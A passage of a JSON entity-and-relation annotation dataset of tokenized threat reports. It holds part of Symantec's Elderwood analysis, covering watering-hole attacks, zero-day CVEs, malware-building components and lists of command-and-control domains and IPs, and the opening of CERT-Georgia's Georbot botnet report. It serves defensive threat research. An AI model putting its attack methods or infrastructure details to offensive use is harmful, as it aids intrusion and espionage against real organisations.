"visit", "related", "websites", "."], ["Targeting", "a", "specific", "website", "is", "much", "more", "difficult", "than", "merely", "locating", "websites", "that", "contain", "a", "vulnerability", "."], ["The", "attacker", "has", "to", "research", "and", "probe", "for", "a", "weakness", "on", "the", "chosen", "website", "."], ["Indeed", ",", "in", "watering", "hole", "attacks", ",", "the", "attackers", "may", "compromise", "a", "website", "months", "before", "they", "actually", "use", "it", "in", "an", "attack", "."], ["Once", "compromised", ",", "the", "attackers", "periodically", "connect", "to", "the", "website", "to", "ensure", "that", "they", "still", "have", "access", "."], ["This", "way", ",", "the", "attackers", "can", "infect", "a", "number", "of", "websites", "in", "one", "stroke", ",", "thus", "preserving", "the", "value", "of", "their", "zero", "-", "day", "exploit", "."], ["They", "are", "even", "in", "a", "position", "to", "inspect", "the", "website", "logs", "to", "identify", "any", "potential", "victims", "of", "interest", "."], ["This", "technique", "ensures", "that", "they", "obtain", "the", "maximum", "return", "for", "their", "valuable", "zero", "-", "day", "exploit", "."], ["Page", "6", "Security", "Response", "The", "Elderwood", "Project"], ["Although", "watering", "hole", "attacks", "have", "been", "known", "about", "since", "approximately", "March", "of", "2011", ",", "the", "activity", "outlined", "in", "this", "report", "marks", "a", "substantial", "increase", "."], ["Three", "zero", "-", "day", "exploits", ",", "CVE-2012", "-", "0779", ",", "CVE-2012", "-", "1875", ",", "and", "CVE2012", "-", "1889", "have", "all", "been", "used", "within", "a", "30", "-", "day", "period", "to", "serve", "up", "back", "door", "Trojans", "from", "compromised", "websites", "."], ["Figure", "6", "Elderwood", "platform", "Page", "7", "Security", "Response", "The", "Elderwood", "Project"], ["The", "increase", "in", "the", "use", "of", "this", "attack", "technique", "requires", "the", "attackers", "to", "sift", "through", "a", "much", "greater", "amount", "of", "stolen", "information", "than", "a", "targeted", "attack", "relying", "on", "email", ",", "as", "the", "number", "of", "victims", "compromised", "by", "a", "Web", "injection", "attack", "will", "be", "much", "greater", "."], ["Although", "multiple", "emails", "are", "often", "sent", "to", "numerous", "victims", ",", "the", "scale", "of", "such", "attacks", "is", "much", "smaller", "than", "the", "number", "of", "victims", "infected", "by", "visiting", "one", "of", "a", "number", "of", "compromised", "websites", "."], ["We", "believe", ",", "to", "solve", "this", "problem", ",", "the", "attackers", "have", "built", "a", "system", "that", "allows", "them", "to", "execute", "new", "campaigns", "by", "simply", "dropping", "in", "a", "new", "exploit", "and", "various", "other", "components", ",", "such", "as", "Trojans", "and", "hacked", "servers", "."], ["Attack", "platform"], ["The", "attackers", "have", "leaked", "snippets", "of", "information", "that", "hint", "at", "the", "type", "of", "infrastructure", "that", "is", "likely", "to", "be", "used", "to", "implement", "these", "attacks", "."], ["Figure", "6", "is", "a", "diagram", "of", "the", "various", "processes", "and", "steps", "that", "that", "the", "Elderwood", "attackers", "must", "go", "through", "to", "conduct", "their", "attacks", "."], ["All", "attacks", "require", "a", "Trojan", "to", "infect", "the", "target", "computer", "."], ["This", "Trojan", "is", "packaged", "with", "a", "packer", "and", "also", "the", "address", "of", "the", "command", "-", "and", "-", "control", "(", "C&C", ")", "server", "."], ["The", "next", "step", "is", "to", "deliver", "that", "packaged", "Trojan", "to", "the", "target", "."], ["Delivery", "is", "either", "though", "an", "email", "or", "a", "Web", "based", "vector", "."], ["We", "have", "identified", "two", "distinct", "elements", "in", "the", "delivery", "vector", "that", "demonstrate", "the", "potential", "attack", "infrastructure", "."], ["Document", "creation", "kit"], ["The", "attackers", "often", "delivered", "their", "malicious", "code", "via", "documents", "attached", "to", "email", "."], ["Based", "on", "our", "analysis", ",", "we", "believe", "the", "attackers", "have", "built", "a", "tool", "that", "easily", "allows", "them", "to", "automatically", "construct", "documents", "containing", "different", "payloads", "."], ["The", "tool", "is", "able", "to", "take", "an", "arbitrary", "clean", "document", "file", ",", "specific", "exploit", "code", ",", "and", "a", "Trojan", ",", "and", "bundle", "them", "together", "to", "create", "a", "malicious", "document", "ready", "to", "be", "used", "in", "the", "next", "attack", "."], ["This", "tool", "is", "one", "component", "of", "the", "Elderwood", "platform", "."], ["The", "use", "of", "such", "a", "tool", "can", "be", "readily", "seen", "in", "samples", "that", "exploit", "the", "CVE-2012", "-", "0779", "vulnerability", "where", "multiple", "document", "files", "were", "encoded", "in", "the", "same", "manner", ",", "but", "the", "Trojan", "payload", "differed", "."], ["Shared", "SWF", "file"], ["Another", "component", "used", "in", "the", "attacks", "is", "a", "Shockwave", "Flash", "(", "SWF", ")", "file", "."], ["Often", ",", "to", "ensure", "reliable", "execution", "of", "exploit", "code", ",", "code", "must", "be", "placed", "in", "the", "right", "areas", "of", "computer", "memory", "."], ["In", "addition", ",", "exploit", "code", "often", "performs", "the", "same", "task", "of", "downloading", "a", "Trojan", "from", "a", "remote", "website", "for", "execution", "."], ["Instead", "of", "developing", "code", "to", "perform", "these", "tasks", "for", "each", "different", "exploit", ",", "the", "attackers", "have", "developed", "a", "common", "SWF", "file", "that", "is", "used", "solely", "to", "create", "the", "correct", "conditions", "in", "memory", "and", "accepts", "a", "parameter", "specifying", "where", "to", "download", "the", "Trojan", "."], ["In", "some", "attacks", ",", "the", "parameter", "name", "was", "\u201c", "Elderwood", ".", "\u201d"], ["The", "same", "SWF", "file", "was", "seen", "used", "when", "exploiting", "3", "different", "vulnerabilities", "(", "CVE-2012", "-", "0779", ",", "CVE-2012", "-", "1875", ",", "CVE-2012", "-", "1889", ")", "."], ["By", "using", "a", "common", "SWF", "file", ",", "the", "attackers", "can", "simply", "deploy", "a", "new", "trigger", ",", "that", "is", ",", "a", "zero", "-", "day", "exploit", ",", "and", "the", "SWF", "handles", "the", "rest", "of", "the", "work", ",", "retrieving", "and", "decoding", "the", "back", "door", "Trojan", "."], ["These", "various", "re", "-", "usable", "components", "collectively", "make", "up", "the", "Elderwood", "attack", "platform", ",", "as", "shown", "in", "figure", "6", "."], ["There", "is", "no", "doubt", "that", "there", "are", "several", "other", "components", "that", "the", "attackers", "use", "in", "their", "various", "processes", "as", "well", "."], ["Other", "possible", "components", "of", "the", "attack", "platform", "may", "include", ":", "\u2022"], ["A", "tool", "for", "the", "automated", "creation", "of", "accounts", "on", "Web", "-", "based", "email", "services", "\u2022", "Automated", "registration", "of", "domain", "names", "\u2022"], ["Information", "gathering", "on", "targets", "\u2013", "searching", "for", ",", "and", "consolidating", "data", "on", ",", "a", "victim", "to", "identify", "potential", "website", "targets", "and", "relevant", "topics", "for", "email", "content"], ["\u2022", "An", "analysis", "platform", "for", "stolen", "information", "Page", "8", "Security", "Response", "The", "Elderwood", "Project", "The", "reuse", "of", "the", "identified", "components", "gives", "clues", "as", "to", "how", "the", "attackers", "may", "divide", "the", "labor", "amongst", "themselves", "."], ["Technically", "skilled", "hackers", "(", "researchers", ")", "create", "exploits", ",", "document", "creation", "kits", ",", "re", "-", "usable", "trigger", "code", "(", "the", "SWF", "files", ")", ",", "and", "compromise", "websites", ",", "and", "these", "are", "then", "made", "available", "to", "less", "technical", "attackers", "."], ["These", "attackers", "(", "attack", "operators", ")", "are", "likely", "responsible", "for", "identifying", "targets", "and", "delivering", "the", "attack", "payload", "using", "the", "tools", "and", "infrastructure", "provided", "to", "them", "."], ["Once", "a", "target", "has", "been", "compromised", ",", "the", "less", "skilled", "attack", "operators", "can", "then", "proceed", "to", "move", "through", "the", "compromised", "network", ",", "identifying", "data", "of", "interest", "."], ["The", "level", "of", "technical", "skill", "required", "to", "move", "through", "a", "compromised", "network", "is", "much", "lower", "than", "that", "required", "to", "establish", "the", "initial", "penetration", "."], ["Connecting", "the", "dots"], ["The", "investigation", "into", "the", "various", "exploits", "began", "with", "a", "deep", "analysis", "of", "CVE-2012", "-", "0779", "."], ["From", "this", "analysis", ",", "we", "identified", "several", "Trojans", "which", "were", "dropped", "from", "documents", "utilizing", "the", "exploit", "."], ["These", "Trojans", "helped", "us", "begin", "the", "process", "of", "establishing", "links", "between", "the", "various", "zero", "-", "day", "exploits", "."], ["The", "code", "in", "one", "of", "those", "Trojans", "was", "obfuscated", "in", "a", "certain", "way", "."], ["This", "same", "obfuscation", "was", "used", "on", "a", "Trojan", "dropped", "by", "CVE-2012", "-", "1875", ",", "establishing", "a", "link", "between", "the", "use", "of", "these", "two", "exploits", "."], ["Going", "back", "in", "time", ",", "the", "Hydraq", "Trojan", "also", "displayed", "this", "obfuscation", "."], ["Additional", "links", "joining", "the", "various", "exploits", "together", "included", "a", "shared", "command", "-", "and", "-", "control", "infrastructure", "."], ["Trojans", "dropped", "by", "different", "exploits", "were", "connecting", "to", "the", "same", "servers", "to", "retrieve", "commands", "from", "the", "attackers", "."], ["Some", "compromised", "websites", "used", "in", "the", "watering", "hole", "attacks", "had", "two", "different", "exploits", "injected", "into", "them", "one", "after", "the", "other", "."], ["Yet", "another", "connection", "is", "the", "use", "of", "similar", "encryption", "in", "documents", "and", "malicious", "executables", "."], ["A", "technique", "used", "to", "pass", "data", "to", "a", "SWF", "file", "was", "re", "-", "used", "in", "multiple", "attacks", "."], ["Finally", ",", "the", "same", "family", "of", "Trojan", "was", "dropped", "from", "multiple", "different", "exploits", "."], ["Figure", "7", "illustrates", "the", "connections", "between", "the", "various", "exploits", "."], ["Figure", "7", "Links", "between", "different", "exploits", "Page", "9", "Security", "Response", "The", "Elderwood", "Project"], ["Conclusion"], ["Simple", "targeted", "attacks", "are", "quite", "common", "."], ["Most", "(", "the", "Taidoor", "attackers", "for", "example", ")", "reuse", "exploits", "and", "are", "relatively", "simple", "to", "block", ",", "if", "one", "ensures", "that", "one", "\u2019s", "network", "and", "software", "is", "regularly", "patched", "."], ["Somewhat", "more", "sophisticated", "attackers", "use", "zero", "-", "day", "exploits", "."], ["The", "Elderwood", "hackers", "use", "multiple", "zero", "-", "day", "exploits", ",", "multiple", "Trojans", ",", "and", "multiple", "delivery", "vectors", "."], ["They", "are", "responsible", "for", "compromising", "numerous", "websites", ",", "corporations", ",", "and", "individuals", "over", "the", "past", "three", "years", "."], ["This", "group", "is", "focused", "on", "wholesale", "theft", "of", "intellectual", "property", "and", "clearly", "has", "the", "resources", ",", "in", "terms", "of", "manpower", ",", "funding", ",", "and", "technical", "skills", ",", "required", "to", "implement", "this", "task", "."], ["Although", "we", "have", "not", "conclusively", "established", "a", "connection", "between", "the", "most", "recent", "exploits", "and", "those", "used", "in", "attacks", "in", "2011", ",", "there", "are", "similarities", "."], ["Apart", "from", "the", "technical", "features", "in", "common", ",", "as", "mentioned", "previously", "(", "URL", "encoding", ")", ",", "there", "is", "a", "noticeable", "similarity", "in", "the", "timing", "of", "the", "attacks", "and", "the", "types", "of", "vulnerabilities", "used", "between", "the", "2012", "and", "2011", "attacks", "."], ["Both", "sets", "of", "attacks", "used", "multiple", "zero", "-", "day", "exploits", "one", "after", "the", "other", ",", "sometime", "around", "April", "to", "August", ",", "and", "both", "sets", "of", "attacks", "exploit", "Adobe", "Flash", "and", "Internet", "Explorer", "."], ["It", "may", "be", "the", "case", "that", "these", "initial", "\u201c", "penetration", "\u201d", "attacks", "are", "launched", "over", "a", "fixed", "period", "of", "time", "(", "several", "months", "from", "approximately", "April", "to", "August", ")", "."], ["After", "this", "initial", "compromise", ",", "the", "attackers", "consolidate", "their", "beachhead", "and", "begin", "to", "analyze", "the", "stolen", "information", ",", "spreading", "through", "networks", "and", "maintaining", "access", "as", "needed", "."], ["By", "analyzing", "the", "information", "gathered", ",", "the", "attackers", "can", "identify", "yet", "more", "targets", "of", "interest", "."], ["They", "may", "also", "eventually", "be", "detected", "and", "evicted", "from", "a", "compromised", "network", "."], ["In", "later", "attacks", ",", "newly", "identified", "targets", "can", "be", "attacked", "and", "old", "victims", "can", "be", "targeted", "again", "."], ["If", "this", "is", "the", "case", ",", "then", "companies", "and", "individuals", "need", "to", "be", "on", "their", "guard", "."], ["Any", "manufacturers", "who", "are", "in", "the", "defense", "supply", "chain", "need", "to", "be", "wary", "of", "attacks", "emanating", "from", "subsidiaries", ",", "business", "partners", ",", "and", "associated", "companies", "."], ["It", "is", "possible", "that", "those", "trusted", "companies", "were", "compromised", "by", "the", "attackers", "who", "are", "then", "using", "them", "as", "a", "stepping", "-", "stone", "to", "the", "true", "intended", "target", "."], ["Companies", "and", "individuals", "should", "prepare", "themselves", "for", "a", "new", "round", "of", "attacks", "in", "2013", "utilizing", "both", "Adobe", "Flash", "and", "Internet"], ["Explorer", "zero", "-", "day", "exploits", "."], ["This", "is", "particularly", "the", "case", "for", "companies", "who", "have", "been", "compromised", "in", "the", "past", "and", "managed", "to", "evict", "the", "attackers", "."], ["The", "knowledge", "that", "the", "attackers", "gained", "in", "their", "previous", "compromise", "will", "assist", "them", "in", "any", "future", "attacks", "."], ["Resources", "Symantec", "Security", "Response", "Blog", "http://www.symantec.com/connect/symantec-blogs/sr", "Follow", "Symantec", "Security", "Response", "on", "Twitter"], ["http://twitter.com/threatintel"], ["Page", "10", "Security", "Response", "The", "Elderwood", "Project", "Appendix", "Malware", "detection", "names"], ["The", "Elderwood", "gang", "uses", "multiple", "different", "Trojans", "."], ["The", "ones", "identified", "to", "date", "are", "detected", "using", "the", "detection", "names", "in", "table", "2", "."], ["Table", "2", "Trojans", "associated", "with", "Elderwood", "gang"], ["Associated", "Trojans", "Backdoor", "."], ["Briba", "Trojan", "."], ["Hydraq", "Trojan", "."], ["Naid", "Backdoor", "."], ["Wiarp", "Backdoor", "."], ["Vasport", "Trojan", "."], ["Pasam", "Backdoor", "."], ["Darkmoon"], ["Packed", "."], ["Generic.379"], ["Packed", "."], ["Generic.374"], ["Backdoor", "."], ["Ritsol", "Backdoor", "."], ["Nerex", "Backdoor", "."], ["Linfo", "Command", "-", "and", "-", "control", "servers", "Table", "3", "shows", "the", "command", "and", "control", "servers", "."], ["Table", "3", "Command", "and", "control", "servers", "C&C", "domains", "qwby.gownsman.com"], ["wwwcnas.org", "gate-usa.com"], ["3dvideo.ru", "wt.ikwb.com"], ["svr01.passport.serveuser.com", "zfcay1751.chinaw3.com", "web.cyut.edu.tw"], ["srv001.proxydns.com"], ["help.2012hi.hk", "0207.gm.jetos.com"], ["71.6.217.131"], ["javaupdate.freeddns.com"], ["yours.microtrendsoft.com", "cpu.edu.tw", "glogin.ddns.us", "download.msdnblog.com", "dd.pst.qpoe.com", "Page", "11", "Security", "Response", "The", "Elderwood", "Project", "Symantec", "protection"], ["Many", "different", "Symantec", "protection", "technologies", "play", "a", "role", "in", "defending", "against", "this", "threat", ",", "including", ":", "File", "-", "based", "protection", "(", "Traditional", "antivirus", ")"], ["Traditional", "antivirus", "protection", "is", "designed", "to", "detect", "and", "block", "malicious", "files", "and", "is", "effective", "against", "files", "associated", "with", "this", "attack", "."], ["\u2022"], ["\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "Bloodhound", "."], ["Exploit.469"], ["Bloodhound", "."], ["Exploit.465"], ["Bloodhound", "."], ["Exploit.466"], ["Bloodhound", "."], ["Olexe.2", "Bloodhound", "."], ["Flash.15"], ["Packed", "."], ["Generic.379"], ["Packed", "."], ["Generic.374", "Backdoor", "."], ["Briba", "Trojan", "."], ["Hydraq", "Trojan", "."], ["Naid", "Backdoor", "."], ["Wiarp", "Backdoor", "."], ["Vasport", "Trojan", "."], ["Pasam", "Backdoor", "."], ["Darkmoon", "Backdoor", "."], ["Ritsol", "Backdoor", "."], ["Nerex", "Backdoor", "."], ["Linfo", "Trojan", "."], ["MDropper", "Network", "-", "based", "protection", "(", "IPS", ")"], ["Network", "-", "based", "protection", "in", "Symantec", "Endpoint", "Protection", "can", "help", "protect", "against", "unauthorized", "network", "activities", "conducted", "by", "malware", "threats", "or", "intrusion", "attempts", "."], ["\u2022"], ["\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "Adobe", "Flash", "Type", "Confusion", "CVE-2012", "-", "0779"], ["(", "25718", ")", "RTMP", "Type", "Confusion", "CVE-2012", "-", "0779", "2", "(", "25721", ")"], ["MSIE", "MSXML"], ["CVE-2012", "-", "1889", "3", "(", "25783", ")"], ["MSIE", "MSXML"], ["CVE-2012", "-", "1889", "2", "(", "50331", ")"], ["MSIE", "MSXML"], ["CVE-2012", "-", "1889", "(", "25786", ")"], ["Malicious", "SWF", "Download", "CVE-2012", "-", "1535", "2", "(", "25878", ")"], ["Malicious", "SWF", "Download", "4", "(", "25789", ")"], ["MSIE", "Same", "ID", "Property", "CVE-2012", "-", "1875", "(", "25787", ")"], ["MSIE", "CVE-2010", "-", "0249", "(", "23823", ")"], ["Malformed", "XLS", "SWF", "Remote", "Code", "Execution", "CVE-2011", "-", "0609", "(", "24136", ")"], ["Flash", "Player", "CVE-2011", "-", "2110", "(", "24336", ")"], ["Adobe", "Embedded", "SWF", "CVE-2011", "-", "0611", "(", "24212", ")", "Behavior", "-", "based", "protection"], ["Behavior", "-", "based", "detection", "blocks", "suspicious", "processes", "using", "the", "Bloodhound", "."], ["SONAR", "series", "of", "detections", "Reputation", "-", "based", "protection", "(", "Insight", ")"], ["\u2022"], ["Norton", "Safeweb", "blocks", "users", "from", "visiting", "infected", "websites", "."], ["\u2022", "Insight", "detects", "and", "warns", "against", "suspicious", "files", "as", "WS.Reputation.1", "Page", "12", "Security", "Response", "The", "Elderwood", "Project"], ["Email", "-", "based", "protection"], ["Symantec", "MessageLabs", "Email", "Security.cloud", "can", "block", "emails", "associated", "with", "these", "attacks", "Other", "protection", "\u2022", "Application", "and", "Device", "Control", "(", "SEP", ")", "prevents", "malicious", "document", "files", "from", "dropping", "the", "backdoor"], ["TrojanSymantec", "Critical", "System", "Protection", "can", "also", "prevent", "unauthorized", "applications", "from", "running", "."], ["\u2022", "Browser", "Protection", "can", "protect", "against", "web", "based", "attacks", "which", "use", "exploits", "\u2022", "Symantec", "Critical", "System", "Protection", "can", "help", "to", "lock", "down", "system", "and", "prevent", "intrusions", "\u2022", "Data", "Loss", "Prevention", "(", "DLP", ")", "can", "prevent", "confidential", "data", "from", "being", "accessed", "or", "exfiltrated", "by", "the", "attacker", "Page", "13", "Security", "Response", "Any", "technical", "information", "that", "is", "made", "available", "by", "Symantec", "Corporation", "is", "the", "copyrighted", "work", "of", "Symantec", "Corporation", "and", "is", "owned", "by", "Symantec", "Corporation", "."], ["NO", "WARRANTY", "."], ["The", "technical", "information", "is", "being", "delivered", "to", "you", "as", "is", "and", "Symantec", "Corporation", "makes", "no", "warranty", "as", "to", "its", "accuracy", "or", "use", "."], ["Any", "use", "of", "the", "technical", "documentation", "or", "the", "information", "contained", "herein", "is", "at", "the", "risk", "of", "the", "user", "."], ["Documentation", "may", "include", "technical", "or", "other", "inaccuracies", "or", "typographical", "errors", "."], ["Symantec", "reserves", "the", "right", "to", "make", "changes", "without", "prior", "notice", "."], ["About", "Symantec", "Symantec", "is", "a", "global", "leader", "in", "providing", "security", ",", "storage", "and", "systems", "management", "solutions", "to", "help", "businesses", "and", "consumers", "secure", "and", "manage", "their", "information", "."], ["Headquartered", "in", "Mountain", "View", ",", "Calif.", ",", "Symantec", "has", "operations", "in", "more", "than", "40", "countries", "."], ["More", "information", "is", "available", "at", "www.symantec.com", "."], ["About", "the", "authors"], ["Geoff", "McDonald", "-", "Threat", "Analysis", "Engineer"], ["Gavin", "O\u2019Gorman", "-", "Sr", "Threat", "Intelligence", "Analyst", "For", "specific", "country", "offices", "and", "contact", "numbers", ",", "please", "visit", "our", "Web", "site", "."], ["For", "product", "information", "in", "the", "U.S.", ",", "call", "toll", "-", "free", "1", "(", "800", ")", "745", "6054", "."], ["Symantec", "Corporation", "World", "Headquarters", "350", "Ellis", "Street", "Mountain", "View", ",", "CA", "94043"], ["USA"], ["+1", "(", "650", ")", "527", "-", "8000", "www.symantec.com", "Copyright", "\u00a9", "2012", "Symantec", "Corporation", "."], ["All", "rights", "reserved", "."], ["Symantec", "and", "the", "Symantec", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Symantec", "Corporation", "or", "its", "affiliates", "in", "the", "U.S.", "and", "other", "countries", "."], ["Other", "names", "may", "be", "trademarks", "of", "their", "respective", "owners", "."]]}, {"vertexSet": [[{"name": "Georbot", "pos": [1, 2], "sent_id": 2, "type": "Malware"}], [{"name": "CERT-Georgia", "pos": [8, 11], "sent_id": 4, "type": "Organization"}], [{"name": "Computer Emergency Response Team\u201d of Republic of Georgia", "pos": [15, 24], "sent_id": 4, "type": "Organization"}], [{"name": "Georgian and American Security Documents", "pos": [0, 5], "sent_id": 7, "type": "Information"}], [{"name": "Georgian News-Related web-sites", "pos": [1, 8], "sent_id": 24, "type": "ExploitTargetObject"}], [{"name": "www.caucasustimes.com", "pos": [0, 1], "sent_id": 28, "type": "ExploitTargetObject"}], [{"name": "www.cei.ge", "pos": [7, 8], "sent_id": 29, "type": "ExploitTargetObject"}], [{"name": "www.psnews.ge", "pos": [5, 6], "sent_id": 30, "type": "ExploitTargetObject"}], [{"name": "ema.gov.ge", "pos": [10, 11], "sent_id": 30, "type": "ExploitTargetObject"}], [{"name": "www.opentext.ge", "pos": [11, 12], "sent_id": 30, "type": "ExploitTargetObject"}], [{"name": "www.presa.ge", "pos": [12, 13], "sent_id": 30, "type": "ExploitTargetObject"}], [{"name": "www.presage.tv", "pos": [13, 14], "sent_id": 30, "type": "ExploitTargetObject"}], [{"name": "www.psnews.info", "pos": [14, 15], "sent_id": 30, "type": "ExploitTargetObject"}], [{"name": "www.resonancedaily.com", "pos": [0, 1], "sent_id": 31, "type": "ExploitTargetObject"}], [{"name": "September, 2010", "pos": [7, 10], "sent_id": 45, "type": "Time"}], [{"name": "United States", "pos": [13, 15], "sent_id": 45, "type": "Country"}], [{"name": "March, 2011", "pos": [17, 20], "sent_id": 45, "type": "Time"}], [{"name": "Georgia", "pos": [23, 24], "sent_id": 45, "type": "Country"}], [{"name": "April , 2011", "pos": [29, 32], "sent_id": 45, "type": "Time"}], [{"name": "178.32.91.70", "pos": [33, 34], "sent_id": 45, "type": "Address"}], [{"name": "France", "pos": [35, 36], "sent_id": 45, "type": "Country"}], [{"name": "June, 2011", "pos": [1, 4], "sent_id": 47, "type": "Time"}], [{"name": "88.198.240.123", "pos": [5, 6], "sent_id": 47, "type": "Address"}], [{"name": "88.198.238.55", "pos": [7, 8], "sent_id": 47, "type": "Address"}], [{"name": "Germany", "pos": [9, 10], "sent_id": 47, "type": "Country"}], [{"name": "October, 2011", "pos": [1, 4], "sent_id": 48, "type": "Time"}], [{"name": "94.199.48.104", "pos": [5, 6], "sent_id": 48, "type": "Address"}], [{"name": "Hungary", "pos": [7, 8], "sent_id": 48, "type": "Country"}], [{"name": "November. 2011", "pos": [10, 13], "sent_id": 48, "type": "Time"}], [{"name": "173.212.192.83", "pos": [14, 15], "sent_id": 48, "type": "Address"}], [{"name": "United States", "pos": [16, 18], "sent_id": 48, "type": "Country"}], [{"name": "December, 2011", "pos": [19, 22], "sent_id": 48, "type": "Time"}], [{"name": "31.31.75.63", "pos": [23, 24], "sent_id": 48, "type": "Address"}], [{"name": "Czech Republic", "pos": [25, 27], "sent_id": 48, "type": "Country"}], [{"name": "January, 2012", "pos": [28, 31], "sent_id": 48, "type": "Time"}], [{"name": "31.214.140.214", "pos": [32, 33], "sent_id": 48, "type": "Address"}], [{"name": "Germany", "pos": [34, 35], "sent_id": 48, "type": "Country"}], [{"name": "March, 2012", "pos": [36, 39], "sent_id": 48, "type": "Time"}], [{"name": "78.46.145.24", "pos": [40, 41], "sent_id": 48, "type": "Address"}], [{"name": "Germany", "pos": [42, 43], "sent_id": 48, "type": "Country"}], [{"name": "Canada", "pos": [22, 23], "sent_id": 51, "type": "Country"}], [{"name": "Ukraine", "pos": [24, 25], "sent_id": 51, "type": "Country"}], [{"name": "China", "pos": [28, 29], "sent_id": 51, "type": "Country"}], [{"name": "Russia", "pos": [36, 37], "sent_id": 51, "type": "Country"}], [{"name": "30 March, 2011", "pos": [57, 61], "sent_id": 51, "type": "Time"}], [{"name": "14 September 2011", "pos": [68, 71], "sent_id": 51, "type": "Time"}], [{"name": "25 November 2011", "pos": [88, 91], "sent_id": 51, "type": "Time"}], [{"name": "12 December 2011", "pos": [5, 8], "sent_id": 52, "type": "Time"}], [{"name": "Video Recording", "pos": [10, 12], "sent_id": 52, "type": "MalwareCharacteristics"}], [{"name": "Frame.php", "pos": [13, 14], "sent_id": 56, "type": "Exploit"}], [{"name": "calc.exe", "pos": [7, 8], "sent_id": 57, "type": "Malware"}], [{"name": "Calc.exe", "pos": [8, 9], "sent_id": 57, "type": "Malware"}], [{"name": "usbserv.exe", "pos": [2, 3], "sent_id": 58, "type": "GeneralVirus"}], [{"name": "frame.php", "pos": [9, 10], "sent_id": 59, "type": "Malware"}], [{"name": "CVE-2010-0842", "pos": [2, 5], "sent_id": 60, "type": "Vulnerability"}], [{"name": "CVE-2006-3730", "pos": [6, 9], "sent_id": 60, "type": "Vulnerability"}], [{"name": "MS06-057", "pos": [10, 13], "sent_id": 60, "type": "Vulnerability"}], [{"name": "frame.php", "pos": [6, 7], "sent_id": 61, "type": "Malware"}], [{"name": "0day", "pos": [4, 5], "sent_id": 63, "type": "Exploit"}], [{"name": "Searching Sensitive word\u2019s In filenames", "pos": [0, 6], "sent_id": 73, "type": "MalwareCharacteristics"}], [{"name": "Recording Videos from Webcam", "pos": [0, 4], "sent_id": 75, "type": "MalwareCharacteristics"}], [{"name": "Modify malware code file from C&C Web Panel", "pos": [0, 8], "sent_id": 76, "type": "MalwareCharacteristics"}], [{"name": "Self-Created Packer, Crypter in Assembler Language", "pos": [10, 19], "sent_id": 76, "type": "MalwareCharacteristics"}], [{"name": "Update mechanism", "pos": [27, 29], "sent_id": 76, "type": "MalwareCharacteristics"}], [{"name": "Base-encoded plaintext", "pos": [30, 34], "sent_id": 76, "type": "MalwareCharacteristics"}], [{"name": "opening network socket at ring0 level", "pos": [2, 8], "sent_id": 78, "type": "MalwareCharacteristics"}], [{"name": "TDSS Rootkit Modification", "pos": [13, 16], "sent_id": 78, "type": "MalwareCharacteristics"}], [{"name": "Ministries", "pos": [41, 42], "sent_id": 78, "type": "ExploitTargetObject"}], [{"name": "Parliament", "pos": [44, 45], "sent_id": 78, "type": "ExploitTargetObject"}], [{"name": "Critical Information Ifrastructures", "pos": [47, 50], "sent_id": 78, "type": "ExploitTargetObject"}], [{"name": "Banks", "pos": [2, 3], "sent_id": 79, "type": "ExploitTargetObject"}], [{"name": "NGO\u2019s", "pos": [5, 7], "sent_id": 79, "type": "ExploitTargetObject"}], [{"name": "Blocked each of 6 C&C IP addresses", "pos": [17, 24], "sent_id": 79, "type": "CourseOfAction"}], [{"name": "identified all Georgian infected IP\u2019s", "pos": [7, 13], "sent_id": 81, "type": "CourseOfAction"}], [{"name": "gave mitigation strategies and cleaning tools to Infected Agencies and Institutions", "pos": [14, 25], "sent_id": 81, "type": "CourseOfAction"}], [{"name": "Cooperated with Antivirus, IDS/IPS solutions, to create mitigating tools and signatures", "pos": [2, 17], "sent_id": 82, "type": "CourseOfAction"}], [{"name": "Cooperated with FBI", "pos": [16, 19], "sent_id": 83, "type": "CourseOfAction"}], [{"name": "Hosting Providers Abuse Teams", "pos": [0, 4], "sent_id": 84, "type": "CourseOfAction"}], [{"name": "Law Enforcement Agencies to obtain log files and system images for Forensic Analysis", "pos": [2, 15], "sent_id": 85, "type": "CourseOfAction"}], [{"name": "Russian Official State", "pos": [17, 20], "sent_id": 97, "type": "Attacker"}], [{"name": "Warynews.ru", "pos": [0, 1], "sent_id": 98, "type": "Indicator"}], [{"name": "Russian Business Network", "pos": [16, 19], "sent_id": 98, "type": "Attacker"}], [{"name": "www.rbc.ru", "pos": [9, 10], "sent_id": 99, "type": "Indicator"}]], "labels": [{"r": "P7", "h": 53, "t": 54, "evidence": [59, 60]}, {"r": "P7", "h": 53, "t": 55, "evidence": [59, 60]}, {"r": "P7", "h": 53, "t": 56, "evidence": [59, 60]}], "title": "201210LEPLGeorBot", "sents": [["CYBER", "ESPIONAGE"], ["Against", "Georgian", "Government"], ["(", "Georbot", "Botnet", ")"], ["CERT.GOV.GE", "LEPL", "Data", "Exchange", "Agency", "Ministry", "of", "Justice", "of", "Georgia"], ["1|P", "ag", "e", "Summary", "In", "march", ",", "2011", "CERT", "-", "Georgia", "which", "is", "Governmental", "\u201c", "Computer", "Emergency", "Response", "Team", "\u201d", "of", "Republic", "of", "Georgia", "has", "Discovered", "Cyber", "Attack", "Incident", ",", "which", "seems", "to", "be", "Cyber"], ["Espionage", "Example", "."], ["Advanced", "Malicious", "Software", "was", "Collecting", "Sensitive", ",", "Confidential", "Information", "about"], ["Georgian", "and", "American", "Security", "Documents", "and", "then", "uploading", "it", "to", "some", "of", "Command", "and", "Control", "Servers", "."], ["(", "which", "changes", "often", "upon", "detection", ")", "."], ["After", "investigating", "Attackers", "Servers", "and", "Malicious", "Files", ",", "we", "have", "linked", "this", "Cyber", "Attack", "to", "Russian", "Official", "Security", "Agencies", "."], ["2|P", "ag", "e", "After", "Analysing", "Webserver", ",", "Malicious", "Files", "and", "Various", "Scripts", "we", "found", "out", "that", ":", "1", "."], ["Some", "of", "the", "Georgian", "NEWS", "-", "related", "sites", "were", "Hacked", "."], ["(", "The", "Malicious", "script", "was", "injected", "only", "in", "the", "pages", ",", "where", "SPECIFIC", "information", "was", "presented", ")"], ["2", "."], ["After", "visiting", "this", "pages", "Computer", "was", "infected", "by", "Unknown", "Malicious", "Program", "."], ["(", "None", "of", "Antivirus", "Product", "could", "Identify", "the", "threat", ",", "by", "the", "time", "of", "discovery", ")", "."], ["3", "."], ["When", "executed", ",", "Malicious", "File", "Fully", "Controls", "Infected", "Computers", "."], ["4", 